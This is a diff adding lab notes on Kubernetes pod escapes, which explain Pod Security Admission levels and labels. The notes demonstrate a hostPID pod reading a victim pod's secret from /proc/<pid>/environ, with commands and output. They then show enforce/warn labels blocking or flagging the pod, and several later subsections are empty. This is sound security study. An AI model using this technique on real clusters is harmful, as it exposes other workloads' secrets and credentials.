@@ -488,5 +488,170 @@ oom_group_kill 0
 
 [capabilities walkthough](https://blog.senyuuri.info/posts/2021-02-06-linux-capability-a-kernel-workthrough/)
 
+## [](#header-2)Kubernetes Escapes / Pod Privilege Escalations
+[Experiments we taken from here](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
+
+Examples and expretiments in the article were made with PSP (Pod Security Policies). Currently this technology is deprecated
+```
+Removed feature
+PodSecurityPolicy was deprecated in Kubernetes v1.21, and removed from Kubernetes in v1.25.
+```
+
+My current k8s version is v1.30.4, so we should use PSA (Pod Security Admission)
+
+All configs in the article will still work, so if we want to:
+```yaml
+spec:
+  hostPID: true
+```
+It will work, but the conception of security in the current k8s state is to do it via PSA
+
+So how it should be done now? [Here it is](https://kubernetes.io/docs/concepts/security/pod-security-admission/)
+
+We define security profiles for namespaces (not for pods) and we have 3 predefined levels [here](https://kubernetes.io/docs/concepts/security/pod-security-standards/):
+- privileged: (allowed)
+- - Privileged Containers: Pod can be run with the ```privileged: true``` flag
+- - Host access: Allow parameters such as ```hostPID: true```, ```hostIPC: true```, ```hostNetwork: true```, and binding to host ports
+- - Running with root privileges: Containers can run as root user (```runAsUser=0```) without any restrictions
+- - Mounting sensitive file systems: Mounting volumes like ```hostPath```, ```proc``` and others that provide direct access to the host file system is allowed
+- - Unprotected capabilities: All Linux capabilities such as ```CAP_SYS_ADMIN``` or ```CAP_NET_ADMIN``` are allowed
+- baseline (allowed)
+- - Normal Containers: Containers can work with both root and unprivileged users, but it is forbidden to explicitly enable privileged mode (```privileged: false```)
+- - Limited access to host resources: Parameters such as ```hostPID```, ```hostIPC```, ```hostNetwork```, and ```hostPorts``` are denied by default
+- - Partial access to capabilities: Only safe capabilities such as ```CAP_CHOWN```, ```CAP_SETUID```, ```CAP_SETGID``` are allowed, but unsafe capabilities such as ```CAP_SYS_ADMIN``` are prohibited
+- - Mounting safe volumes: Standard volume types are allowed, but volumes of type ```hostPath``` that provide access to the host file system are forbidden
+- - Running containers as root user: Allowed by default, but it is recommended to avoid this by using ```runAsNonRoot```
+- restricted (forbidden)
+- - Privileged Containers: Completely prohibit the use of ```privileged: true```
+- - Access to host resources: The ```hostPID```, ```hostIPC```, ```hostNetwork```, and use of host ports are completely prohibited
+- - Run as root: Containers must be run as non-root with the ```runAsNonRoot: true``` parameter
+- - Mounting file systems: Mounting unsafe volumes such as ```hostPath``` is prohibited. Only standard, secure volume types are allowed
+- - Restricted capabilities: Containers cannot request extended privileges such as ```CAP_SYS_ADMIN``` and other high-risk capabilities
+- restricted (allowed)
+- - Unprivileged containers: Containers can only be run with the minimum required privileges
+- - Running as a non-root user: Use of ```runAsNonRoot``` is mandatory
+- - Enhanced Security: Requirements for AppArmor, seccomp and other security mechanisms (if enabled)
+
+And we also have 3 labels, the names speak for themselves:
+- enforce - policy violations will cause the pod to be rejected
+- audit - policy violations will trigger the addition of an audit annotation to the event recorded in the audit log, but are otherwise allowed
+- warn - policy violations will trigger a user-facing warning, but are otherwise allowed
+
+### [](#header-3)Experiments
+We will create a namespace and a pod and change its properties
+```yaml
+ns.yml
+apiVersion: v1
+kind: Namespace
+metadata:
+ name: vuln-psa-ns
+```
+
+```yaml
+attacker.yml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: attacker
+  namespace: vuln-psa-ns
+spec:
+  containers:
+  - name: attacker
+    image: ubuntu
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  nodeName: worker
+```
+
+And now let's go through the list from the article and adopt PSP things with currently being used PSA
+
+#### [](#header-4)hostPID
+We can access the list of PIDs of the host if we set ```hostPID: true``` in ```spec```
+
+This allows us to read enviroments of others cluster pods processes and kill processes
+```yaml
+...
+spec:
+  hostPID: true
+...
+```
+If we do nothing with the namespace and do not assign any labels, we can simple run it and benefit:
+```bash
+> kubectl -n vuln-psa-ns exec -it pods/hostpid-pod -- ps aux
+
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.1 170336 12704 ?        Ss   Aug11   1:49 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    Aug11   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        S    Aug11   0:00 [pool_workque
+root           4  0.0  0.0      0     0 ?        I<   Aug11   0:00 [kworker/R-rc
+root           5  0.0  0.0      0     0 ?        I<   Aug11   0:00 [kworker/R-rc
+root           6  0.0  0.0      0     0 ?        I<   Aug11   0:00 [kworker/R-sl
+root           7  0.0  0.0      0     0 ?        I<   Aug11   0:00 [kworker/R-ne
+root           9  0.0  0.0      0     0 ?        I<   Aug11   0:00 [kworker/0:0H
+root          11  0.0  0.0      0     0 ?        I    Aug11   0:00 [kworker/u8:0
+root          12  0.0  0.0      0     0 ?        I<   Aug11   0:00 [kworker/R-mm
+root          13  0.0  0.0      0     0 ?        I    Aug11   0:00 [rcu_tasks_kt
+root          14  0.0  0.0      0     0 ?        I    Aug11   0:00 [rcu_tasks_ru
+root          15  0.0  0.0      0     0 ?        I    Aug11   0:00 [rcu_tasks_tr
+root          16  0.0  0.0      0     0 ?        S    Aug11   0:05 [ksoftirqd/0]
+...
+```
+To test our ability to steal env we can create another pod (in default ns, doesn't matter) and get the source of ```/proc/pid/environ``` file(it's obviously important so that the both pods would be on the same node):
+```yaml
+victim.yml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: victim
+spec:
+  containers:
+  - name: victim
+    image: ubuntu
+    command: [ "/bin/bash", "-c", "--" ]
+    args: [ "FLAG=supersecret sleep 9999999" ]
+  nodeName: worker
+```
+
+```bash
+kubectl -n vuln-psa-ns exec -it pods/hostpid-pod -- bash
+
+root@hostpid-pod:/# ps aux | grep 999
+root     1549154  0.0  0.0   2384  1024 ?        Ss   20:17   0:00 sleep 9999999
+
+root@hostpid-pod:/# grep -a "FLAG" /proc/1549154/environ 
+FLAG=supersecretKUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_S....
+```
+
+Now lets add labels to our namespace config:
+
+- If we add ```pod-security.kubernetes.io/enforce: privileged``` - nothing changes, we still can do all the things
+- If we add ```pod-security.kubernetes.io/warn: restricted``` we get a warning, but still the pods has been created
+```bash
+kubectl create -f attacker.yml
+Warning: would violate PodSecurity "restricted:latest": allowPrivilegeEscalation != false (container "attacker" must set securityContext.allowPrivilegeEscalation=false), unrestricted capabilities (container "attacker" must set securityContext.capabilities.drop=["ALL"]), runAsNonRoot != true (pod or container "attacker" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container "attacker" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
+pod/attacker created
+```
+So from now on we'll use just ```enforce: privileged``` or ```enforce: restricted``` because we test :)
+
+- and if ```pod-security.kubernetes.io/enforce: restricted```:
+```bash
+kubectl apply -f attacker.yml
+⎈ default
+Error from server (Forbidden): error when creating "attacker.yml": pods "attacker" is forbidden: violates PodSecurity "restricted:latest": allowPrivilegeEscalation != false (container "attacker" must set securityContext.allowPrivilegeEscalation=false), unrestricted capabilities (container "attacker" must set securityContext.capabilities.drop=["ALL"]), runAsNonRoot != true (pod or container "attacker" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container "attacker" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
+```
+And the pod is not created
+
+#### [](#header-4)hostNetwork
+
+#### [](#header-4)hostIPC
+
+#### [](#header-4)hostPath
+
+#### [](#header-4)privileged
+
+
+
+
+
 # [](#header-1)All Links / Resources
 [Papers extracted from the proceedings of the Ottawa Linux Symposium](https://www.kernel.org/doc/ols/)
